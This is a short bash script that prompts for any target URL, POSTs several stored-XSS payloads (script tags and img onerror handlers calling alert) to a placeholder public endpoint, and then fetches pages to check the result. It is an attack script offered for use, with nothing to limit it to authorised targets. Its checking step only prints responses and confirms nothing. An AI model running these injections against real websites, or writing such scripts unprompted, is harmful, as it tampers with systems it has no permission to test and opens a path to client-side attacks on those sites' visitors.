#!/bin/bash

# Function to send POST requests
send_post_request() {
  local url=$1
  local data=$2
  curl -s -X POST "$url" -d "$data"
}

# Function to send GET requests
send_get_request() {
  local url=$1
  curl -s -X GET "$url"
}

# Prompt the user for the target URL
read -p "Enter the target URL (e.g., http://example.com): " target_url

# Example payloads to test public-facing pages
payloads=(
  "title=\"><img src=x onerror=alert(1)>"
  "name=\"><script>alert(1)</script>"
  "message=\"><img src=x onerror=alert(2)>"
)

echo "Proceeding with XSS payload injection on public-facing pages."

# Inject XSS payloads on public-facing pages
for payload in "${payloads[@]}"; do
  send_post_request "${target_url}/some_public_endpoint" "$payload"
done

echo "Payloads injected. Verifying XSS vulnerabilities on public-facing pages."

# Verify XSS injection by sending GET requests
send_get_request "${target_url}/some_public_page"
send_get_request "${target_url}/"

echo "Verification complete. Check the server response for XSS vulnerabilities."
